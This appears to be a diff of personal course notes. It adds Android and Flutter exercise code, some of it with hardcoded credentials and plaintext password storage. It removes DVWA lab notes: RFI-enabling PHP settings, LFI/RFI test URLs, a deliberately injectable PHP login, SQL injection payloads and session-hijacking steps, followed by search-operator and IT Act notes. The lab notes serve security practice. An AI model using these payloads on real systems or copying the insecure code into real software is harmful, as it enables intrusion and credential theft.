+ @Override
+ public void onClick(View v) {
+ myRef.addListenerForSingleValueEvent(new ValueEventListener() {
+ @Override
+ public void onDataChange(@NonNull DataSnapshot snapshot) {
+ studentList.clear();
+ for(DataSnapshot snp : snapshot.getChildren()) {
+ Student std = snp.getValue(Student.class);
+ studentList.add(std);
+ }
+
+ List<String> display = new ArrayList<>();
+ for(Student s: studentList) {
+ display.add("ID: " + s.getId() +
+ "\nRoll No: " + s.getRollno() +
+ "\nName: " + s.getName() +
+ "\nGPA: " + s.getGradePointAverage() +
+ "\nDepartment: " + s.getDepartment());
+ }
+ ArrayAdapter<String> adapter = new ArrayAdapter<>(MainActivity.this,
+ android.R.layout.simple_list_item_1, display);
+ lv.setAdapter(adapter);
+ }
+
+ @Override
+ public void onCancelled(@NonNull DatabaseError error) {
+ }
+ });
+ }
+ });
+ }
+}
 ```
 
-Click **Create / Reset Database** → Login (admin/password) → Set security to **Low**
 
-### Apache & PHP changes (for RFI testing)
+###### Shared Pref
 
-Add to `httpd.conf` or `httpd-xampp.conf`:
+```java
+SplashScreen.java
+package com.example.myapplication;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.os.Handler;
+import androidx.appcompat.app.AppCompatActivity;
 
-```apache
-<Directory "C:/xampp/htdocs">
-    php_admin_value allow_url_include 1
-    php_admin_value allow_url_fopen 1
-</Directory>
+public class SplashActivity extends AppCompatActivity {
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_splash);
+        SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
+        final boolean loggedIn = prefs.getBoolean("isLoggedIn", false);
+        new Handler().postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                if (loggedIn) {
+                    startActivity(new Intent(SplashActivity.this, HomeActivity.class));
+                } else {
+                    startActivity(new Intent(SplashActivity.this, LoginActivity.class));
+                }
+                finish();
+            }
+        }, 1500);
+    }
+}
+
+LoginActivity.java
+package com.example.myapplication;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.widget.Button;
+import android.widget.CheckBox;
+import android.widget.EditText;
+import android.widget.Toast;
+
+import androidx.appcompat.app.AppCompatActivity;
+
+public class LoginActivity extends AppCompatActivity {
+
+    EditText etUser, etPass;
+    CheckBox chkRemember;
+    Button btnLogin;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_login);
+
+        etUser = findViewById(R.id.etUser);
+        etPass = findViewById(R.id.etPass);
+        chkRemember = findViewById(R.id.chkRemember);
+        btnLogin = findViewById(R.id.btnLogin);
+
+        btnLogin.setOnClickListener(v -> {
+            String username = etUser.getText().toString().trim();
+            String password = etPass.getText().toString().trim();
+
+            if (username.equals("admin") && password.equals("1234")) {
+                if (chkRemember.isChecked()) {
+                    SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
+                    SharedPreferences.Editor editor = prefs.edit();
+                    editor.putBoolean("isLoggedIn", true);
+                    editor.apply();
+                }
+
+                startActivity(new Intent(LoginActivity.this, HomeActivity.class));
+                finish();
+            } else {
+                Toast.makeText(LoginActivity.this, "Invalid Username or Password", Toast.LENGTH_SHORT).show();
+            }
+        });
+    }
+}
+
+HomeActivity.java
+package com.example.myapplication;
+import android.content.Intent;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.widget.Button;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class HomeActivity extends AppCompatActivity {
+
+    Button btnLogout;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_home);
+
+        btnLogout = findViewById(R.id.btnLogout);
+
+        btnLogout.setOnClickListener(v -> {
+            SharedPreferences prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
+            SharedPreferences.Editor editor = prefs.edit();
+            editor.clear();
+            editor.apply();
+
+            startActivity(new Intent(HomeActivity.this, LoginActivity.class));
+            finish();
+        });
+    }
+}
 ```
 
-In `C:\xampp\php\php.ini`:
+###### Alert-SP
 
+```java
+MainActivity.java
+package com.example.myapplication;
+import android.content.DialogInterface;
+import android.content.SharedPreferences;
+import android.os.Bundle;
+import android.widget.Button;
+import android.widget.EditText;
+import android.widget.Toast;
+import androidx.appcompat.app.AlertDialog;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class MainActivity extends AppCompatActivity {
+
+    EditText etUser, etPass;
+    Button btnLogin;
+    SharedPreferences prefs;
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+        etUser = findViewById(R.id.etUser);
+        etPass = findViewById(R.id.etPass);
+        btnLogin = findViewById(R.id.btnLogin);
+        prefs = getSharedPreferences("MyPrefs", MODE_PRIVATE);
+        etUser.setText(prefs.getString("username", ""));
+        etPass.setText(prefs.getString("password", ""));
+        btnLogin.setOnClickListener(v -> showAlert());
+    }
+
+    private void showAlert() {
+        AlertDialog.Builder builder = new AlertDialog.Builder(this);
+        builder.setTitle("Save Login?");
+        builder.setMessage("Do you want to save your credentials?");
+
+        builder.setPositiveButton("Yes", new DialogInterface.OnClickListener() {
+            public void onClick(DialogInterface dialog, int which) {
+                SharedPreferences.Editor editor = prefs.edit();
+                editor.putString("username", etUser.getText().toString());
+                editor.putString("password", etPass.getText().toString());
+                editor.apply();
+                Toast.makeText(MainActivity.this, "Saved!", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        builder.setNegativeButton("No", new DialogInterface.OnClickListener() {
+            public void onClick(DialogInterface dialog, int which) {
+                Toast.makeText(MainActivity.this, "Not Saved", Toast.LENGTH_SHORT).show();
+            }
+        });
+
+        builder.show();
+    }
+}
 ```
-allow_url_include = On
+
+
+###### notification
+
+```java
+MainActivity.java
+package com.example.myapplication;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.content.Intent;
+import android.content.pm.PackageManager;
+import android.os.Build;
+import android.os.Bundle;
+import android.view.View;
+import android.widget.Button;
+
+import androidx.appcompat.app.AppCompatActivity;
+import androidx.core.app.ActivityCompat;
+import androidx.core.app.NotificationCompat;
+import androidx.core.content.ContextCompat;
+
+public class MainActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_main);
+
+        Button btn = findViewById(R.id.btnNotify);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel channel = new NotificationChannel(
+                    "myChannel",
+                    "MyChannel",
+                    NotificationManager.IMPORTANCE_DEFAULT
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            if (manager != null) {
+                manager.createNotificationChannel(channel);
+            }
+        }
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(this,
+                    android.Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
+                ActivityCompat.requestPermissions(this,
+                        new String[]{android.Manifest.permission.POST_NOTIFICATIONS}, 100);
+            }
+        }
+
+        btn.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                Intent intent = new Intent(MainActivity.this, SecondActivity.class);
+                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
+
+                PendingIntent pi = PendingIntent.getActivity(
+                        MainActivity.this,
+                        0,
+                        intent,
+                        PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
+                );
+
+                NotificationCompat.Builder builder = new NotificationCompat.Builder(MainActivity.this, "myChannel")
+                        .setSmallIcon(android.R.drawable.ic_dialog_info)
+                        .setContentTitle("Simple Notification")
+                        .setContentText("Tap to open SecondActivity")
+                        .setPriority(NotificationCompat.PRIORITY_DEFAULT)
+                        .setContentIntent(pi)
+                        .setAutoCancel(true);
+
+                NotificationManager manager = (NotificationManager) getSystemService(NOTIFICATION_SERVICE);
+                if (manager != null) {
+                    manager.notify(1, builder.build());
+                }
+            }
+        });
+    }
+}
+SecondActivity.java
+package com.example.myapplication;
+import android.os.Bundle;
+import androidx.appcompat.app.AppCompatActivity;
+
+public class SecondActivity extends AppCompatActivity {
+
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        setContentView(R.layout.activity_second);
+    }
+}
+
+AndroidManifest.xml
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
+
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/ic_launcher"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.MyApplication">
+        <activity
+            android:name=".SecondActivity"
+            android:exported="false" />
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+    </application>
+</manifest>
 ```
 
-Restart Apache.
 
-### LFI/RFI testing
 
-Open file inclusion module:
 
-```
-http://localhost/DVWA-master/vulnerabilities/fi/?page=include.php
-```
+# Flutter-BMI
 
-Include local file:
-
-```
-?page=http://localhost/sqlinjection/login.php
+```java
+bmi_app/
+ ├─ lib/
+ │   ├─ main.dart
+ │   └─ BMICalculator.dart   <-- your widget 
+ ├─ pubspec.yaml
+ └─ android/  ios/  (platform folders)
 ```
 
-Include remote file (RFI demo):
+```java
+BMICalculator.dart
+// lib/BMICalculator.dart
+import 'package:flutter/material.dart';
 
+class BMICalculator extends StatefulWidget {
+  const BMICalculator({super.key});
+
+  @override
+  State<BMICalculator> createState() => _BMICalculatorState();
+}
+
+class _BMICalculatorState extends State<BMICalculator> {
+  final TextEditingController heightController = TextEditingController();
+  final TextEditingController weightController = TextEditingController();
+  double bmiResult = 0.0;
+
+  void calculateBMI() {
+    setState(() {
+      try {
+        final double height = double.parse(heightController.text);
+        final double weight = double.parse(weightController.text);
+
+        if (height <= 0 || weight <= 0) {
+          throw Exception('Height and weight must be positive numbers');
+        }
+
+        bmiResult = weight / (height * height);
+      } catch (e) {
+        bmiResult = 0.0;
+      }
+    });
+  }
+
+  String _getCategory(double bmi) {
+    if (bmi < 18.5) return 'Underweight 😲';
+    if (bmi <= 24.9) return 'Normal Weight 😉';
+    if (bmi <= 29.9) return 'Overweight 🤒';
+    return 'Obese 💀';
+  }
+
+  void clearResult() {
+    setState(() {
+      heightController.clear();
+      weightController.clear();
+      bmiResult = 0.0;
+    });
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(
+        backgroundColor: Colors.green,
+        title: const Text(
+          'BMI Calculator',
+          style: TextStyle(color: Colors.white),
+        ),
+      ),
+      body: Center(
+        child: Padding(
+          padding: const EdgeInsets.all(16.0),
+          child: Column(
+            mainAxisAlignment: MainAxisAlignment.center,
+            children: [
+              TextField(
+                controller: heightController,
+                keyboardType: TextInputType.number,
+                decoration: const InputDecoration(
+                  labelText: 'Height (m)',
+                  border: OutlineInputBorder(),
+                ),
+              ),
+              const SizedBox(height: 20),
+              TextField(
+                controller: weightController,
+                keyboardType: TextInputType.number,
+                decoration: const InputDecoration(
+                  labelText: 'Weight (kg)',
+                  border: OutlineInputBorder(),
+                ),
+              ),
+              const SizedBox(height: 30),
+              ElevatedButton(
+                onPressed: calculateBMI,
+                child: const Text('Calculate BMI'),
+              ),
+              const SizedBox(height: 12),
+              ElevatedButton(
+                onPressed: clearResult,
+                child: const Text('Clear'),
+              ),
+              const SizedBox(height: 30),
+              bmiResult > 0
+                  ? Container(
+                      width: double.infinity,
+                      padding: const EdgeInsets.all(20),
+                      decoration: BoxDecoration(
+                        color: Colors.greenAccent,
+                        borderRadius: BorderRadius.circular(10),
+                      ),
+                      child: Column(
+                        children: [
+                          Text(
+                            'BMI: ${bmiResult.toStringAsFixed(1)}',
+                            style: const TextStyle(
+                              fontSize: 24,
+                              fontWeight: FontWeight.bold,
+                            ),
+                          ),
+                          Text(
+                            'You are ${_getCategory(bmiResult)}',
+                            style: const TextStyle(fontSize: 20),
+                          ),
+                        ],
+                      ),
+                    )
+                  : const SizedBox.shrink(),
+            ],
+          ),
+        ),
+      ),
+    );
+  }
+}
+
+main.dart
+import 'package:flutter/material.dart';
+import 'BMICalculator.dart';
+
+void main() {
+  runApp(const MyApp());
+}
+
+class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      title: 'BMI App',
+      theme: ThemeData(
+        primarySwatch: Colors.green,
+      ),
+      home: const BMICalculator(),
+    );
+  }
+}
 ```
-?page=http://www.google.com
+
+
+# Regi
+
+```java
+registration_form/
+│
+├── lib/
+│   ├── main.dart
+│   ├── RegistrationForm.dart
+│   └── DetailsPage.dart
+│
+├── pubspec.yaml
+│
+├── android/        (Auto generated)
+├── ios/            (Auto generated)
+├── test/
+└── build/
 ```
 
-### Create basic login files (for testing LFI)
+```java
+lib/main.dart
+import 'package:flutter/material.dart';
+import 'RegistrationForm.dart';
 
-* Place `login.php`, `index.php`, `logout.php` in `C:\xampp\htdocs\sqlinjection`
-### **login.php**
+void main() {
+  runApp(const MyApp());
+}
 
-```php
-<?php
-$message="";
-if(count($_POST)>0) {
-    $con = mysqli_connect('127.0.0.1','root','', 'dvwa') or die('Unable To connect');
-    $result = mysqli_query($con,"SELECT * FROM login_user WHERE user_name='" .
-        $_POST["user_name"] . "' and password = '". $_POST["password"]."'");
-    $row  = mysqli_fetch_array($result);
-    if(is_array($row)) {
-        $_SESSION["id"] = $row['id'];
-        $_SESSION["name"] = $row['name'];
+class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: const RegistrationForm(),
+    );
+  }
+}
+
+lib/RegistrationForm.dart
+import 'package:flutter/material.dart';
+import 'DetailsPage.dart';
+
+class RegistrationForm extends StatefulWidget {
+  const RegistrationForm({super.key});
+
+  @override
+  State<RegistrationForm> createState() => _RegistrationFormState();
+}
+
+class _RegistrationFormState extends State<RegistrationForm> {
+  final TextEditingController nameController = TextEditingController();
+  String? gender;
+  bool langEnglish = false;
+  bool langHindi = false;
+  bool langMarathi = false;
+
+  final List<String> cities = ["Mumbai", "Delhi", "Pune"];
+  String? selectedCity;
+
+  bool darkBackground = false;
+
+  void onSubmit() {
+    List<String> langList = [];
+    if (langEnglish) langList.add("English");
+    if (langHindi) langList.add("Hindi");
+    if (langMarathi) langList.add("Marathi");
+
+    Navigator.push(
+      context,
+      MaterialPageRoute(
+        builder: (context) => Details(
+          name: nameController.text,
+          gender: gender ?? "Not selected",
+          languages: langList,
+          selectedCity: selectedCity,
+        ),
+      ),
+    );
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text("Registration Form"), backgroundColor: Colors.green),
+      body: Container(
+        color: darkBackground ? Colors.green[50] : Colors.white,
+        child: Padding(
+          padding: const EdgeInsets.all(16.0),
+          child: SingleChildScrollView(
+            child: Column(
+              crossAxisAlignment: CrossAxisAlignment.stretch,
+              children: [
+                TextField(
+                  controller: nameController,
+                  decoration: const InputDecoration(
+                    labelText: "Enter name:",
+                    border: OutlineInputBorder(),
+                  ),
+                ),
+                const SizedBox(height: 16),
+                const Text("Select your gender:"),
+                RadioListTile(
+                  title: const Text("Male"),
+                  value: "Male",
+                  groupValue: gender,
+                  onChanged: (value) => setState(() => gender = value),
+                ),
+                RadioListTile(
+                  title: const Text("Female"),
+                  value: "Female",
+                  groupValue: gender,
+                  onChanged: (value) => setState(() => gender = value),
+                ),
+                const SizedBox(height: 16),
+                const Text("Select the languages:"),
+                CheckboxListTile(
+                  title: const Text("English"),
+                  value: langEnglish,
+                  onChanged: (val) => setState(() => langEnglish = val ?? false),
+                ),
+                CheckboxListTile(
+                  title: const Text("Hindi"),
+                  value: langHindi,
+                  onChanged: (val) => setState(() => langHindi = val ?? false),
+                ),
+                CheckboxListTile(
+                  title: const Text("Marathi"),
+                  value: langMarathi,
+                  onChanged: (val) => setState(() => langMarathi = val ?? false),
+                ),
+                const SizedBox(height: 16),
+                DropdownButton(
+                  isExpanded: true,
+                  value: selectedCity,
+                  hint: const Text("Select city"),
+                  items: cities.map((e) => DropdownMenuItem(value: e, child: Text(e))).toList(),
+                  onChanged: (value) => setState(() => selectedCity = value),
+                ),
+                SwitchListTile(
+                  title: const Text("Dark Background"),
+                  value: darkBackground,
+                  onChanged: (val) => setState(() => darkBackground = val),
+                ),
+                const SizedBox(height: 24),
+                ElevatedButton(onPressed: onSubmit, child: const Text("Submit")),
+              ],
+            ),
+          ),
+        ),
+      ),
+    );
+  }
+}
+
+lib/DetailsPage.dart
+import 'package:flutter/material.dart';
+
+class Details extends StatelessWidget {
+  final String name;
+  final String gender;
+  final List<String> languages;
+  final String? selectedCity;
+
+  const Details({
+    super.key,
+    required this.name,
+    required this.gender,
+    required this.languages,
+    required this.selectedCity,
+  });
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text("Details"), backgroundColor: Colors.blue),
+      body: Padding(
+        padding: const EdgeInsets.all(16.0),
+        child: Column(
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            Text("Name: $name"),
+            Text("Gender: $gender"),
+            Text("Languages: ${languages.isEmpty ? "None" : languages.join(", ")}"),
+            Text("City: ${selectedCity ?? "Not selected"}"),
+          ],
+        ),
+      ),
+    );
+  }
+}
+```
+
+
+# crud-fluttersqlite
+
+```java
+sqflite_crud/
+│
+├── lib/
+│   ├── main.dart
+│   ├── Homepage.dart
+│   └── database_helper.dart
+│
+├── pubspec.yaml
+│
+├── android/
+├── ios/
+└── build/
+```
+
+```java
+pubspec.yaml (dependencies section)
+dependencies:
+  flutter:
+    sdk: flutter
+  cupertino_icons: ^1.0.8
+  sqflite: ^2.2.0
+  path_provider: ^2.0.15
+  path: ^1.8.3
+
+lib/main.dart
+import 'package:flutter/material.dart';
+import 'Homepage.dart';
+
+void main() {
+  runApp(const MyApp());
+}
+
+class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+
+  @override
+  Widget build(BuildContext context) {
+    return MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: const MyHomePage(),
+    );
+  }
+}
+
+lib/database_helper.dart
+import 'dart:async';
+import 'dart:io';
+import 'package:path/path.dart';
+import 'package:path_provider/path_provider.dart';
+import 'package:sqflite/sqflite.dart';
+
+class DatabaseHelper {
+  static const _databaseName = "MyDatabase.db";
+  static const _databaseVersion = 1;
+
+  static const table = 'my_table';
+  static const columnId = '_id';
+  static const columnName = 'name';
+
+  DatabaseHelper._privateConstructor();
+  static final DatabaseHelper instance = DatabaseHelper._privateConstructor();
+
+  static Database? _database;
+
+  Future<Database> get database async {
+    _database ??= await _initDatabase();
+    return _database!;
+  }
+
+  Future<Database> _initDatabase() async {
+    Directory documentsDirectory = await getApplicationDocumentsDirectory();
+    String path = join(documentsDirectory.path, _databaseName);
+    return await openDatabase(path,
+        version: _databaseVersion, onCreate: _onCreate);
+  }
+
+  Future _onCreate(Database db, int version) async {
+    await db.execute('''
+      CREATE TABLE $table (
+        $columnId INTEGER PRIMARY KEY,
+        $columnName TEXT NOT NULL
+      )
+    ''');
+  }
+
+  Future<int> insert(Map<String, dynamic> row) async {
+    Database db = await database;
+    return await db.insert(table, row);
+  }
+
+  Future<List<Map<String, dynamic>>> queryAllRows() async {
+    Database db = await database;
+    return await db.query(table);
+  }
+
+  Future<int> update(Map<String, dynamic> row) async {
+    Database db = await database;
+    int id = row[columnId];
+    return await db.update(table, row, where: '$columnId = ?', whereArgs: [id]);
+  }
+
+  Future<int> delete(int id) async {
+    Database db = await database;
+    return await db.delete(table, where: '$columnId = ?', whereArgs: [id]);
+  }
+}
+
+lib/Homepage.dart
+
+import 'package:flutter/material.dart';
+import 'database_helper.dart';
+
+class MyHomePage extends StatefulWidget {
+  const MyHomePage({super.key});
+
+  @override
+  State<MyHomePage> createState() => _MyHomePageState();
+}
+
+class _MyHomePageState extends State<MyHomePage> {
+  final _idController = TextEditingController();
+  final _nameController = TextEditingController();
+
+  String _message = "";
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text('SQLite Demo')),
+      body: Padding(
+        padding: const EdgeInsets.all(16.0),
+        child: Column(
+          children: [
+            TextField(controller: _idController, decoration: const InputDecoration(labelText: "ID")),
+            TextField(controller: _nameController, decoration: const InputDecoration(labelText: "Name")),
+            const SizedBox(height: 20),
+
+            ElevatedButton(
+              onPressed: () async {
+                final id = int.tryParse(_idController.text.trim());
+                final name = _nameController.text.trim();
+
+                if (id == null || name.isEmpty) {
+                  setState(() => _message = "Enter valid ID & Name");
+                  return;
+                }
+
+                await DatabaseHelper.instance.insert({
+                  DatabaseHelper.columnId: id,
+                  DatabaseHelper.columnName: name,
+                });
+
+                _idController.clear();
+                _nameController.clear();
+
+                setState(() => _message = "Inserted Successfully");
+              },
+              child: const Text("Insert"),
+            ),
+
+            ElevatedButton(
+              onPressed: () async {
+                final rows = await DatabaseHelper.instance.queryAllRows();
+                setState(() => _message = rows.toString());
+              },
+              child: const Text("Show"),
+            ),
+
+            ElevatedButton(
+              onPressed: () async {
+                final id = int.tryParse(_idController.text.trim());
+                final name = _nameController.text.trim();
+                if (id == null || name.isEmpty) {
+                  setState(() => _message = "Enter valid ID & Name");
+                  return;
+                }
+                await DatabaseHelper.instance.update({
+                  DatabaseHelper.columnId: id,
+                  DatabaseHelper.columnName: name,
+                });
+                setState(() => _message = "Updated Successfully");
+              },
+              child: const Text("Update"),
+            ),
+
+            ElevatedButton(
+              onPressed: () async {
+                final id = int.tryParse(_idController.text.trim());
+                if (id == null) {
+                  setState(() => _message = "Enter valid ID");
+                  return;
+                }
+                await DatabaseHelper.instance.delete(id);
+                setState(() => _message = "Deleted Successfully");
+              },
+              child: const Text("Delete"),
+            ),
+
+            const SizedBox(height: 20),
+            Text(_message, style: const TextStyle(fontSize: 16)),
+          ],
+        ),
+      ),
+    );
+  }
+}
+```
+
+# rest api
+
+```java
+rest_api_app/
+│
+├── lib/
+│   ├── main.dart
+│   ├── HomePage.dart
+│   ├── User.dart
+│   └── Remote_service.dart
+│
+├── pubspec.yaml
+├── android/
+├── ios/
+└── build/
+```
+
+```java
+pubspec.yaml (dependencies)
+dependencies:
+  flutter:
+    sdk: flutter
+  http: ^0.13.6
+
+lib/main.dart
+import 'package:flutter/material.dart';
+import 'HomePage.dart';
+
+void main() {
+  runApp(const MyApp());
+}
+
+class MyApp extends StatelessWidget {
+  const MyApp({super.key});
+
+  @override
+  Widget build(BuildContext context) {
+    return const MaterialApp(
+      debugShowCheckedModeBanner: false,
+      home: MyHomePage(),
+    );
+  }
+}
+
+lib/User.dart
+
+import 'dart:convert';
+
+List<User> userFromJson(String str) =>
+    List<User>.from(json.decode(str).map((x) => User.fromJson(x)));
+
+class User {
+  int rno;
+  String name;
+
+  User({required this.rno, required this.name});
+
+  factory User.fromJson(Map<String, dynamic> json) {
+    return User(
+      rno: json["rno"],
+      name: json["name"],
+    );
+  }
+}
+
+
+lib/Remote_service.dart
+import 'package:http/http.dart' as http;
+import 'User.dart';
+
+class RemoteService {
+  Future<List<User>> getUsers() async {
+    final uri = Uri.parse("https://mocki.io/v1/5e56d735-4e27-4afa-b82a-a4c384c42523");
+
+    final response = await http.get(uri);
+
+    if (response.statusCode == 200) {
+      return userFromJson(response.body);
     } else {
-        $message = "Invalid Username or Password!";
+      return []; // handle safely
     }
+  }
 }
-if(isset($_SESSION["id"])) {
-    header("Location:index.php");
+
+lib/HomePage.dart
+import 'package:flutter/material.dart';
+import 'User.dart';
+import 'Remote_service.dart';
+
+class MyHomePage extends StatefulWidget {
+  const MyHomePage({super.key});
+
+  @override
+  State<MyHomePage> createState() => _MyHomePageState();
 }
-?>
-<html>
-<head><title>User Login</title></head>
-<body>
-<form method="post" align="center">
-<div><?php if($message!="") { echo $message; } ?></div>
-<h3>Enter Login Details</h3>
-Username: <input type="text" name="user_name"><br>
-Password: <input type="password" name="password"><br><br>
-<input type="submit" value="Submit">
-</form>
-</body>
-</html>
-```
 
-### **index.php**
+class _MyHomePageState extends State<MyHomePage> {
+  List<User>? users;
+  bool isLoaded = false;
 
-```php
-<?php session_start(); ?>
-<!doctype html>
-<html>
-<head><meta charset="utf-8"><title>User Dashboard</title></head>
-<body>
-<?php
-if (isset($_SESSION["name"])) {
-    echo "<center><h1>Welcome " . htmlspecialchars($_SESSION["name"]) . "</h1>";
-    echo '<p><a href="logout.php">Logout</a></p></center>';
-} else {
-    echo "<h1>Please login first.</h1>";
+  @override
+  void initState() {
+    super.initState();
+    fetchData();
+  }
+
+  fetchData() async {
+    users = await RemoteService().getUsers();
+    setState(() {
+      isLoaded = true;
+    });
+  }
+
+  @override
+  Widget build(BuildContext context) {
+    return Scaffold(
+      appBar: AppBar(title: const Text("REST API Demo")),
+      body: isLoaded
+          ? (users == null || users!.isEmpty
+              ? const Center(child: Text("No data found"))
+              : ListView.builder(
+                  itemCount: users!.length,
+                  itemBuilder: (context, index) {
+                    return ListTile(
+                      title: Text(users![index].name),
+                      subtitle: Text("Rno: ${users![index].rno}"),
+                    );
+                  }))
+          : const Center(child: CircularProgressIndicator()),
+    );
+  }
 }
-?>
-</body>
-</html>
 ```
-
-### **logout.php**
-
-```php
-<?php
-session_start();
-$_SESSION = array();
-session_destroy();
-header("Location: login.php");
-exit;
-?>
-```
-
-### SQL (sample table + inserts)
-
-```sql
-CREATE TABLE login_user (
-  id INT AUTO_INCREMENT PRIMARY KEY,
-  user_name VARCHAR(50),
-  password VARCHAR(255),
-  name VARCHAR(100)
-);
-INSERT INTO login_user (user_name, password, name)
-VALUES ('admin', 'admin123', 'Admin User'),
-       ('neha', 'neha123', 'Neha Yadav');
-```
-
-### SQL Injection payloads & tests
-
-* Bypass login:
-
-```
-Username: ' OR 1=1--
-Password: anything
-```
-
-* Order-by to find column count:
-
-```
-1' order by 1#
-1' order by 2#
-1' order by 3#   -- triggers error if only 2 columns
-```
-
-* UNION-based data extraction examples:
-
-```
-1' or '1'='1
-1' UNION select user, password from users#
-1' UNION select null, version()#
-1' UNION select null, user()#
-1' UNION select null, database()#
-1' UNION select null, table_name from information_schema.tables#
-1' UNION select null, concat(id,0x0a,user_name,0x0a,password) from users.user_login#
-```
-
-### Session Hijacking (manual cookie edit)
-
-* Tools: Wireshark, EditThisCookie
-* Steps: Capture PHPSESSID for Admin, then replace another user's PHPSESSID with Admin's value using EditThisCookie → refresh → gain access as Admin.
-
----
-
-
-1. Basic Google Operators
-cache: – View Google’s Cached Version of a Page
-Usage:
-
-cache:<URL>
-
-Example:
-
-cache:irs.gov
-
-(Shows Google’s cached version of the US Internal Revenue Service home page.)
-
-info: (or id:) – Get Info About a Website
-Usage:
-
-info:<URL>
-
-Example:
-
-info:theonion.com
-
-(Displays Google’s summary, similar pages, cached version, etc.)
-
-related: – Find Similar/Related Websites
-Usage:
-
-related:<URL>
-
-Example:
-
-related:healthfinder.gov
-
-(Shows sites related to Healthfinder.)
-
-2. Restrict Search Based on Location of Terms
-Operator	Meaning	Example
-allinanchor:	All query words must appear in anchor text	allinanchor:useful parenting sites
-inanchor:	Terms appear in anchor text	restaurants Portland inanchor:kid-friendly
-allintext:	All query words must appear in body text	allintext:ingredients cilantro chicken lime
-intext:	The term must appear in the text	Dan Shugar intext:Powerlight
-allintitle:	All words appear in the title	allintitle: Google Advanced Operators
-intitle:	Terms must appear in the title	movies comedy intitle:top ten
-allinurl:	All terms must appear in URL	allinurl:pez faq
-inurl:	Terms must appear in the URL	pharmaceutical inurl:investor
-3. Google Groups Search Operators
-Operator	Meaning	Example
-author:	Find messages by an author	flvina author:Hamish author:Reid
-group:	Search inside a specific newsgroup	ivan doig group:rec.arts.books
-insubject:	Terms must appear in subject	insubject:"crazy quilts"
-4. Google News Search Operators
-Operator	Meaning	Example
-location:	News from a specific region	queen location:uk
-source:	Specify news outlet	peace source:ha_aretz
-Laws under IT Act 2000 and IT Amendment Act 2008
-Introduction
-The Information Technology (IT) Act, 2000, provides the legal framework for e-governance, digital communication, and cybercrime regulation in India. It recognizes electronic records and digital signatures as legally valid. The IT (Amendment) Act, 2008, strengthened the original law by including data protection, privacy, and cyber terrorism provisions. Together, they form the foundation of cyber law in India, ensuring responsible use of technology.
-
-Key Sections of the IT Act
-Section 43 - Damage to Computer, Computer System, etc.
-Description: Addresses unauthorized access, data theft, or damage to computer systems and networks.
-Case: Bank of America Data Breach (2011) — sensitive data of nearly 90 million customers was exposed due to a stolen laptop.
-Penalty: Imprisonment up to 3 years and/or fine up to ₹5 lakh.
-Preventive Measures: Encrypt sensitive data, restrict access, implement cybersecurity policies.
-Section 65 - Tampering with Computer Source Documents
-Description: Intentional alteration, destruction, or concealment of computer source code.
-Case: Kevin Mitnick accessed company systems, altered source codes, and stole confidential data.
-Penalty: Imprisonment up to 3 years and/or fine.
-Preventive Measures: Use source control systems, regular audits, strong authentication.
-Section 66A - Sending Offensive Messages (Struck down in 2015)
-Description: Penalized sending offensive or threatening electronic messages.
